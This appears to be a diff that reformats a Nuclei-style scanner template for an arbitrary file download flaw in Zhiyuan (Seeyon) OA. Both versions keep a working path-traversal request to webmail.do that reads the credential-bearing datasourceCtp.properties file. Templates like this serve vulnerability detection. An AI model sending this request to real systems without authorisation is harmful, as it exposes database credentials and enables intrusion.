@@ -1,23 +1,21 @@
 id: zhiyuan-fileRead
-
 info:
-  name: 致远OA webmail.do任意文件下载
   author: str1am
+  name: "\u81F4\u8FDCOA webmail.do\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D"
   severity: high
   tags: zhiyuan,fileRead
-
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "workflow"
-          - "ctpDataSource"
-        part: body
-        condition: and
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - workflow
+    - ctpDataSource
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties'
